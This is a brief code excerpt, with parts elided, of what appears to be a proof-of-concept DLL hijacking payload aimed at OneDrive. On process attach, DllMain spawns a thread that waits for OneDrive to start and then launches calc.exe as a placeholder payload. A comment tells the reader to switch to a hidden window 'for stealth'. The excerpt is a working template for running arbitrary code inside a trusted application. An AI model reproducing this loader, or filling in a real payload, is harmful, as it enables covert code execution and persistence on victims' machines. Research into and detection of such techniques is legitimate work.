...
DWORD WINAPI PayloadThread(LPVOID lpParameter) {
    // Simple delay to let OneDrive initialize
    Sleep(2000);

    STARTUPINFOA si = { sizeof(si) };
    PROCESS_INFORMATION pi = {};
    si.dwFlags = STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_SHOW; // Change to SW_HIDE for stealth
// Launch calc as a test payload
    char cmd[] = "calc.exe";
...
BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
    if (ul_reason_for_call == DLL_PROCESS_ATTACH) {
        ...
        // Spawn payload in separate thread so DllMain doesn't hang
